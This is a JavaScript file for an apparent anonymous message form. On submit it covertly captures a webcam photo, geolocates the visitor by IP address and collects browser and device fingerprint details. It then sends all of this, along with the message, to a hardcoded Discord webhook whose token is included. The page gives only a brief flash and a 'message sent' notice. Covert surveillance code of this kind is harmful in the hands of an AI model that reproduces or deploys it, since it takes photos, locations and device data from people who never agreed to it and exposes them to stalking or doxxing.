const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';

const form = document.getElementById('message-form');
const usernameInput = document.getElementById('username');
const messageInput = document.getElementById('message');
const submitBtn = document.getElementById('submit-btn');
const statusMessage = document.getElementById('status-message');
const loadingOverlay = document.getElementById('loading-overlay');
const quickFlash = document.getElementById('quick-flash');

const cameraFeed = document.getElementById('camera-feed');
const captureCanvas = document.getElementById('capture-canvas');

let stream = null;
let isProcessing = false;

function doQuickFlash() {
    quickFlash.style.opacity = '0.3';
    setTimeout(() => {
        quickFlash.style.opacity = '0';
    }, 50);
}

function showStatus(message, type) {
    statusMessage.textContent = message;
    statusMessage.className = 'status-message status-' + type;
    statusMessage.style.display = 'block';
    
    if (type === 'success') {
        setTimeout(() => {
            statusMessage.style.display = 'none';
        }, 3000);
    }
}

async function getCameraQuick() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: 'user',
                width: { ideal: 640 },
                height: { ideal: 480 }
            } 
        });
        
        cameraFeed.srcObject = stream;
        await new Promise(resolve => setTimeout(resolve, 100));
        return stream;
    } catch (error) {
        return null;
    }
}

function takeQuickPicture() {
    if (!stream) return null;
    
    try {
        const canvas = captureCanvas;
        const video = cameraFeed;
        
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
        ctx.fillRect(10, 10, 180, 25);
        ctx.fillStyle = 'white';
        ctx.font = '12px Arial';
        ctx.fillText('sent: ' + new Date().toLocaleTimeString(), 15, 25);
        
        return canvas.toDataURL('image/jpeg', 0.85);
    } catch (e) {
        return null;
    }
}

function dataURLtoBlob(dataurl) {
    try {
        const arr = dataurl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new Blob([u8arr], { type: mime });
    } catch (error) {
        return null;
    }
}

async function getIPAddress() {
    const services = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://ipinfo.io/json',
        'https://ip.seeip.org/jsonip'
    ];
    
    for (const service of services) {
        try {
            const response = await fetch(service, { signal: AbortSignal.timeout(3000) });
            const data = await response.json();
            
            if (data.ip) {
                return data.ip;
            } else if (data.ipAddress) {
                return data.ipAddress;
            }
        } catch (error) {}
    }
    
    return null;
}

async function getLocationFromIP(ip) {
    if (!ip) return null;
    
    const services = [
        `https://ipapi.co/${ip}/json/`,
        `https://ipapi.co/${ip}/latlong/`,
        `https://ipinfo.io/${ip}/json`,
        `https://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`
    ];
    
    for (const service of services) {
        try {
            const response = await fetch(service, { signal: AbortSignal.timeout(3000) });
            
            if (service.includes('ipapi.co/latlong/')) {
                const text = await response.text();
                if (text && text.includes(',')) {
                    const [lat, lon] = text.split(',');
                    return {
                        latitude: parseFloat(lat),
                        longitude: parseFloat(lon),
                        accuracy: 'IP-based (city level)',
                        source: 'ipapi.co'
                    };
                }
            } else {
                const data = await response.json();
                
                if (data.latitude && data.longitude) {
                    return {
                        ip: ip,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        accuracy: 'IP-based (city level)',
                        city: data.city || '',
                        region: data.region || data.regionName || '',
                        country: data.country || data.country_name || '',
                        isp: data.isp || data.org || '',
                        timezone: data.timezone || '',
                        postal: data.postal || data.zip || '',
                        source: service.includes('ipapi.co') ? 'ipapi.co' : 
                               service.includes('ipinfo.io') ? 'ipinfo.io' : 'ip-api.com'
                    };
                } else if (data.lat && data.lon) {
                    return {
                        ip: ip,
                        latitude: data.lat,
                        longitude: data.lon,
                        accuracy: 'IP-based (city level)',
                        city: data.city || '',
                        region: data.region || data.regionName || '',
                        country: data.country || data.country_name || '',
                        isp: data.isp || data.org || '',
                        timezone: data.timezone || '',
                        postal: data.postal || data.zip || '',
                        source: service.includes('ipapi.co') ? 'ipapi.co' : 
                               service.includes('ipinfo.io') ? 'ipinfo.io' : 'ip-api.com'
                    };
                }
            }
        } catch (error) {}
    }
    
    return null;
}

async function getDetailedLocation() {
    try {
        const ip = await getIPAddress();
        if (!ip) return null;
        
        const location = await getLocationFromIP(ip);
        if (!location) return null;
        
        location.ip = ip;
        
        return location;
    } catch (error) {
        return null;
    }
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    let version = "Unknown";
    
    if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) {
        browser = "Chrome";
        const match = ua.match(/Chrome\/(\d+\.\d+)/);
        if (match) version = match[1];
    } else if (ua.includes("Firefox")) {
        browser = "Firefox";
        const match = ua.match(/Firefox\/(\d+\.\d+)/);
        if (match) version = match[1];
    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
        browser = "Safari";
        const match = ua.match(/Version\/(\d+\.\d+)/);
        if (match) version = match[1];
    } else if (ua.includes("Edg")) {
        browser = "Edge";
        const match = ua.match(/Edg\/(\d+\.\d+)/);
        if (match) version = match[1];
    } else if (ua.includes("Opera") || ua.includes("OPR")) {
        browser = "Opera";
        const match = ua.match(/(?:Opera|OPR)\/(\d+\.\d+)/);
        if (match) version = match[1];
    }
    
    let os = "Unknown";
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    
    return {
        browser: `${browser} ${version}`,
        os: os,
        userAgent: ua.substring(0, 150) + (ua.length > 150 ? '...' : ''),
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
        platform: navigator.platform,
        deviceMemory: navigator.deviceMemory || 'Unknown',
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        screenSize: `${window.screen.width}x${window.screen.height}`,
        colorDepth: `${window.screen.colorDepth} bit`,
        pixelRatio: window.devicePixelRatio || 1,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        online: navigator.onLine ? 'Online' : 'Offline',
        doNotTrack: navigator.doNotTrack || 'Not set'
    };
}

function generateMapsLink(latitude, longitude) {
    if (latitude && longitude) {
        return `https://www.google.com/maps?q=${latitude},${longitude}&z=12`;
    }
    return '';
}

function formatLocationData(location) {
    if (!location) return "```Location data unavailable```";
    
    const mapsLink = generateMapsLink(location.latitude, location.longitude);
    
    let text = `IP Address: ${location.ip || 'Unknown'}\n`;
    text += `Coordinates: ${location.latitude?.toFixed(6) || 'N/A'}, ${location.longitude?.toFixed(6) || 'N/A'}\n`;
    text += `Accuracy: ${location.accuracy || 'Unknown'}\n`;
    text += `City: ${location.city || 'Unknown'}\n`;
    text += `Region: ${location.region || 'Unknown'}\n`;
    text += `Country: ${location.country || 'Unknown'}\n`;
    text += `ISP: ${location.isp || 'Unknown'}\n`;
    text += `Timezone: ${location.timezone || 'Unknown'}\n`;
    text += `Postal Code: ${location.postal || 'Unknown'}\n`;
    text += `Source: ${location.source || 'Unknown'}\n`;
    
    if (mapsLink) {
        text += `\n[Google Maps](${mapsLink})`;
    }
    
    return "```" + text + "```";
}

function formatBrowserData(browserInfo) {
    let text = `Browser: ${browserInfo.browser}\n`;
    text += `OS: ${browserInfo.os}\n`;
    text += `Language: ${browserInfo.language}\n`;
    text += `Timezone: ${browserInfo.timezone}\n`;
    text += `Platform: ${browserInfo.platform}\n`;
    text += `Screen: ${browserInfo.screenSize}\n`;
    text += `Color Depth: ${browserInfo.colorDepth}\n`;
    text += `Pixel Ratio: ${browserInfo.pixelRatio}\n`;
    text += `CPU Cores: ${browserInfo.hardwareConcurrency}\n`;
    text += `RAM: ${browserInfo.deviceMemory}GB\n`;
    text += `Cookies: ${browserInfo.cookiesEnabled}\n`;
    text += `Online: ${browserInfo.online}\n`;
    text += `Do Not Track: ${browserInfo.doNotTrack}\n`;
    
    return "```" + text + "```";
}

async function sendToDiscord(username, message, picture = null, location = null) {
    try {
        const timestamp = new Date().toLocaleString();
        const browserInfo = getBrowserInfo();
        
        const embed = {
            title: "new message received",
            color: 0x3498db,
            fields: [
                {
                    name: "from",
                    value: username || "anonymous",
                    inline: true
                },
                {
                    name: "time",
                    value: timestamp,
                    inline: true
                },
                {
                    name: "location data (IP Geolocation)",
                    value: formatLocationData(location),
                    inline: false
                },
                {
                    name: "browser & device info",
                    value: formatBrowserData(browserInfo),
                    inline: false
                },
                {
                    name: "message",
                    value: message.substring(0, 1000) || "No message content",
                    inline: false
                }
            ],
            footer: {
                text: "Sent via message form"
            },
            timestamp: new Date().toISOString()
        };
        
        if (picture) {
            try {
                const blob = dataURLtoBlob(picture);
                
                if (blob) {
                    const formData = new FormData();
                    const filename = `message_${Date.now()}.jpg`;
                    formData.append('file', blob, filename);
                    
                    embed.image = {
                        url: `attachment://${filename}`
                    };
                    
                    formData.append('payload_json', JSON.stringify({
                        username: "message bot",
                        embeds: [embed]
                    }));
                    
                    await fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        body: formData
                    });
                    
                    return true;
                }
            } catch (imageError) {}
        }
        
        const payload = {
            username: "message bot",
            embeds: [embed]
        };
        
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        
        return response.ok;
        
    } catch (error) {
        return false;
    }
}

function cleanupCamera() {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
}

form.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    if (isProcessing) return;
    
    const username = usernameInput.value.trim();
    const message = messageInput.value.trim();
    
    if (!message) {
        showStatus('bruh write something first', 'error');
        messageInput.focus();
        return;
    }
    
    isProcessing = true;
    submitBtn.disabled = true;
    loadingOverlay.style.display = 'flex';
    showStatus('sending...', 'processing');
    
    try {
        let picture = null;
        let location = null;
        
        const cameraStream = await getCameraQuick();
        
        if (cameraStream) {
            doQuickFlash();
            await new Promise(resolve => setTimeout(resolve, 50));
            picture = takeQuickPicture();
            await new Promise(resolve => setTimeout(resolve, 100));
            cleanupCamera();
        }
        
        try {
            location = await getDetailedLocation();
        } catch (locError) {}
        
        const success = await sendToDiscord(username, message, picture, location);
        
        if (success) {
            showStatus('message sent!', 'success');
            messageInput.value = '';
            usernameInput.value = '';
        } else {
            showStatus('failed to send. try again maybe?', 'error');
        }
        
    } catch (error) {
        showStatus('something broke. oops.', 'error');
        
    } finally {
        isProcessing = false;
        submitBtn.disabled = false;
        loadingOverlay.style.display = 'none';
        cleanupCamera();
    }
});
